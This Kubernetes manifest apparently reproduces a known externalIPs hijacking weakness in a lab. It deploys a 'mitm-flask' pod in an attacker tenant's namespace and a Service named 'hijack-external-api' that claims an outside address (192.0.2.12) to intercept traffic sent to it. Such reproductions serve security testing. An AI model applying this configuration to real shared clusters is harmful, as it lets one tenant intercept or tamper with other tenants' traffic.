apiVersion: apps/v1
kind: Deployment
metadata:
  name: mitm-flask
  namespace: tenant-b
spec:
  replicas: 1
  selector:
    matchLabels:
      app: mitm-flask
  template:
    metadata:
      labels:
        app: mitm-flask
    spec:
      nodeSelector:
        tenant: attacker
      containers:
        - name: mitm-flask
          image: mitm-flask:cve2
          imagePullPolicy: Never
          ports:
            - containerPort: 5000
---
apiVersion: v1
kind: Service
metadata:
  name: hijack-external-api
  namespace: tenant-b
spec:
  type: ClusterIP
  selector:
    app: mitm-flask
  ports:
    - name: http
      protocol: TCP
      port: 80
      targetPort: 5000
  externalIPs:
    - 192.0.2.12
